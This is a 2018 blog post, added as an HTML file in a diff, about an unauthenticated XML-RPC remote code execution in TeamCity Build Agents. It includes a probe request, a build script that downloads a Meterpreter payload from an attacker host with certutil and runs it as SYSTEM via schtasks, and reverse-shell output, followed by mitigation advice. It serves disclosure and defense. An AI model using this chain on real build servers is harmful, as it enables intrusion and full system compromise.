@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width; initial-scale=1.0;" />
+    <title>Dylan Pindur | Teamcity Agent XML RPC RCE</title>
+    <link href="https://fonts.googleapis.com/css?family=Abril+Fatface%7CPT+Sans:400,400i,700" rel="stylesheet" />
+    <link href="/css/normalize.css" rel="stylesheet" />
+    <link href="/css/main.css" rel="stylesheet" />
+</head>
+
+<body>
+    <header>
+        <p>
+            <a href="/">Dylan Pindur</a>
+            |
+            <a href="/blog">Blog</a>
+            |
+            <a href="/contact">Contact</a>
+        </p>
+    </header>
+    <article>
+        <header>
+            <h1>Teamcity Agent XML-RPC RCE</h1>
+            <span class="date">Thu, Jul 26, 2018</span>
+        </header>
+        <section>
+            <h2>Teamcity?</h2>
+            <p>
+                For those who haven&rsquo;t had the pleasure, TeamCity is a delightful Continuous Integration tool from
+                JetBrains. TeamCity is commonly deployed to multiple servers, with one TeamCity server responsible for
+                managing build configurations and multiple Build Agent servers responsible for running the builds.
+            </p>
+            <p>
+                The Build Agents can be configured to receive their build commands in either a unidirectional or
+                bidirectional mode. In unidirectional mode the Build Agent polls the server for new build commands and
+                then runs them. In bidirectional mode the TeamCity server pushes the commands down to the Build Agents
+                over port 9090. Up until version 10 this was the default configuration.
+            </p>
+            <p>
+                What is particular charming about this bidirectional mode, is that in its default configuration, there
+                is no authentication, authorisation or encryption of the communications between the TeamCity server and
+                the Build Agent. Combine this with the fact that it&rsquo;s not uncommon for Build Agents to run as
+                System and some real fun can be had.
+            </p>
+        </section>
+        <section>
+            <h2>Identifying a TeamCity Agent</h2>
+            <p>
+                Initially the port appeared as part of an Nmap scan, however service detection was unable to shed much
+                light on the port, other than it&rsquo;s an XML-RPC service over HTTP.
+            </p>
+            <pre><code>PORT     STATE SERVICE VERSION
+9090/tcp open  rtsp
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Server: Apache XML-RPC 1.0
+|     Method GET not implemented (try POST)
+|   HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Server: Apache XML-RPC 1.0
+|     Method OPTIONS not implemented (try POST)
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     Server: Apache XML-RPC 1.0
+|     Method OPTIONS not implemented (try POST)
+|   SIPOptions: 
+|     SIP/2.0 400 Bad Request
+|     Server: Apache XML-RPC 1.0
+|_    Method OPTIONS not implemented (try POST)
+|_rtsp-methods: ERROR: Script execution failed (use -d to debug)</code></pre>
+            <p>
+                Unfortunately, the Build Agents don&rsquo;t support any kind of XML-RPC introspection so we have to make
+                do with Googling and a bit of guesswork to figure out what the service is expecting.
+            </p>
+            <p>
+                Sending through the simple payload here we at least get an error message which confirms that it is a
+                TeamCity Build Agent.
+            </p>
+            <pre><code>POST / HTTP/1.1
+Host: 172.16.198.149:9090
+Connection: close
+Content-Length: 104
+
+&#x3C;?xml version=&#x22;1.0&#x22;?&#x3E;
+&#x3C;methodCall&#x3E;
+    &#x3C;methodName&#x3E;buildAgent.hello&#x3C;/methodName&#x3E;
+    &#x3C;params&#x3E;&#x3C;/params&#x3E;
+&#x3C;/methodCall&#x3E;
+
+HTTP/1.1 200 OK
+Server: Apache XML-RPC 1.0
+Connection: close
+Content-Type: text/xml
+Content-Length: 311
+
+&#x3C;?xml version=&#x22;1.0&#x22;?&#x3E;
+&#x3C;methodResponse&#x3E;
+    &#x3C;fault&#x3E;
+        &#x3C;value&#x3E;
+            &#x3C;struct&#x3E;
+                &#x3C;member&#x3E;
+                    &#x3C;name&#x3E;faultString&#x3C;/name&#x3E;
+                    &#x3C;value&#x3E;java.lang.NoSuchMethodException: jetbrains.buildServer.agent.impl.BuildAgentImpl.hello()&#x3C;/value&#x3E;
+                &#x3C;/member&#x3E;
+                &#x3C;member&#x3E;
+                    &#x3C;name&#x3E;faultCode&#x3C;/name&#x3E;
+                    &#x3C;value&#x3E;
+                        &#x3C;int&#x3E;0&#x3C;/int&#x3E;
+                    &#x3C;/value&#x3E;
+                &#x3C;/member&#x3E;
+            &#x3C;/struct&#x3E;
+        &#x3C;/value&#x3E;
+    &#x3C;/fault&#x3E;
+&#x3C;/methodResponse&#x3E;</code></pre>
+        </section>
+        <section>
+            <h2>Developing an Exploit</h2>
+            <p>Perhaps the best strategy is to install a local copy of TeamCity and inspect the traffic with Wireshark.
+            </p>
+            <p>
+                <img src="img/001-teamcity-wireshark.png" alt="TeamCity Wireshark Capture" />
+            </p>
+            <p>From this we learn that the Build Agent is expecting an XML method call to
+                <code>buildAgent.runBuild</code> and the only parameter this method expects is an XML string containing
+                our build configuration. Nested within this XML blob we can see our actual command line step,
+                <code>echo &amp;quot;Hello World&amp;quot;</code>. Now all we need to do is construct a malicious build
+                configuration and we&rsquo;re good to go!</p>
+            <p>Starting out small we&rsquo;ll replace our echo command with <code>whoami &gt; C:\pwn.txt</code> to print
+                out the account running the TeamCity Build Agent. From this we can see the Build Agent is running as <code>NT
+                AUTHORITY\SYSTEM.</code></p>
+            <p>
+                <img src="img/002-teamcity-local-system.png" alt="TeamCity Running as Local System" />
+            </p>
+            <p>Let&rsquo;s step things up. We&rsquo;ll throw in a Meterpreter payload and go for a reverse shell then
+                call it quits. To do this we&rsquo;ll modify our script to download our Meterpreter payload to a temp
+                directory, schedule a task to execute the payload, run the task and then remove it. This is needed as
+                the Build Agent will step in and kill our Meterpreter process before we can migrate it somewhere else
+                otherwise. We end up with the following build script.</p>
+                <pre><code>certutil -urlcache -split -f http://172.16.198.147/meterpreter.exe %TEMP%/meterpreter.exe
+schtasks /create /tn msf /tr %TEMP%/meterpreter.exe /sc MONTHLY /ru System
+schtasks /run /tn msf
+schtasks /delete /tn msf /f</code></pre>
+            <p>Now all we need to do is send off our XML-RPC call and catch our shell!</p>
+            <pre><code>msf exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 172.16.198.147:4444 
+[*] Meterpreter session 1 opened (172.16.198.147:4444 -> 172.16.198.149:49411) at 2018-07-24 16:13:52 +0800
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter ></code></pre>
+        </section>
+        <section>
+            <h2>Closing Thoughts</h2>
+
+            <p>Please, please, please upgrade to TeamCity 10 or later, where XML-RPC is no longer the default
+                configuration for Build Agents. Failing that, at the very least disable XML-RPC. This can be done on the
+                TeamCity server by setting the following internal property
+                <code>teamcity.agent.communicationProtocols=polling</code>. Alternatively, this property can be set on
+                the individual Build Agents. The Build Agent&rsquo;s property overrides any properties set by the
+                TeamCity server. So any Build Agents which have XML-RPC explicitly enabled will need updating
+                regardless.</p>
+
+            <p>Finally, where possible, perhaps don&rsquo;t run TeamCity Build Agents as Local System or with
+                administrative permissions. We don&rsquo;t want to make things too easy do we?</p>
+        </section>
+        <section>
+            <h2>See Also</h2>
+            <ul>
+                <li><a href="https://confluence.jetbrains.com/display/TCD10/Setting+up+and+Running+Additional+Build+Agents#SettingupandRunningAdditionalBuildAgents-Server-AgentDataTransfersAgent-ServerDataTransfers">TeamCity Agent configuration</a></li>
+                <li><a href="https://www.tenable.com/plugins/nessus/94675">Nessus issue</a></li>
+                <li><a href="https://www.rapid7.com/db/modules/exploit/multi/misc/teamcity_agent_xmlrpc_exec">Metasploit Module</a></li>
+            </ul>
+        </section>
+    </article>
+</body>
+
+</html>
